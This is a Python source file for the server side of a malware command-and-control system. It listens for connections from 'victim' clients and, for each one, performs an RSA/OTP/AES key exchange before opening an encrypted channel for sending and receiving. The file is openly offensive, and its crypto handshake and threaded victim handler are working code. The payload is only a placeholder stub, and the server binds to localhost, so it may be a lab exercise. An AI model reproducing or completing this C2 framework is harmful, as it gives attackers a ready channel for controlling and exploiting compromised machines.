from C2 import *
import socket
from _thread import *
from threading import Thread
import functools
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
import base64


print = functools.partial(print, flush=True)

# thread_lock = threading.Lock()

class Victim(Thread):
    def __init__(self,clSock):
        Thread.__init__(self)
        self.conn = clSock
        self.OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        self.EncryptedOTP = self.conn.recv(self.OTPPacketLen)
        self.rsaKey = RSA.import_key(PRVKEY)
        self.cipher = PKCS1_v1_5.new(self.rsaKey)
        self.OTP = self.cipher.decrypt(self.EncryptedOTP,"failed")
        self.aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)
        self.OTPencodedAESKey = self.applyOTP(self.OTP,self.aesKey)
        self.conn.send(self.OTPencodedAESKey);
        # initiate the session key
        self.SessionKeyPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.EncryptedKey = self.conn.recv(self.SessionKeyPacketLen)
        self.SessionKey = self.cipher.decrypt(self.EncryptedKey,"failed")
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.SessionIV = self.conn.recv(16);
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
    
    def applyOTP(self,OTP, KEY):
        return bytes(o ^ k for o, k in zip(OTP, KEY))


    def secure_send(self, buf: bytes, length: len):
        # Synchronize Buffer
        self.conn.recv(1)
        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
        self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
        # Synchronize buffer
        self.conn.recv(1)
        ciphertext = sessionCipher.encrypt(buf);
        # send the cipher text back to the client
        # the session IV has allready been updated in this instance.
        self.conn.send(ciphertext)
        self.SessionIV = self.conn.recv(16)

    def secure_recv(self,):
        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization")
            sys.exit(-1)
        MSG = self.conn.recv(msgSZ)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization")
            sys.exit(-1)
        plaintext = sessionCipher.decrypt(MSG[16:])
        self.SessionIV = MSG[:16]
        return plaintext;

        
    def run(self):
        print("Payload Placeholder Stub")

class C2(Thread):
    
    def __init__(self,Payload):
        Thread.__init__(self)
        print("Initilizing C2 server")
        self.svr = socket.socket()
        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.svr.bind(('127.0.0.1',PORT_SVR))
        print("C2 Server > Bind Socket: ", PORT_SVR)
        self.svr.listen(24)
        print("C2 Server > Listening for Victim Connections")
        self.vPayload = Payload
    def run(self):
        while True:
            cl, addr = self.svr.accept()
            print("C2 Server > Accepted connection from victim: ", addr)
            v=self.vPayload(cl)
            v.setName("VictimThread")
            v.start()
            
        #cl.recv(1024)
                
        svr.close()

def run(payload):
   VictimHandeler = C2(payload)
   VictimHandeler.setName("VictimHandelerThread")
   VictimHandeler.start()
   print("C2 Server > Victim Handeler Thread has been initiliZed")

if __name__ == "__main__":
    run(Victim)

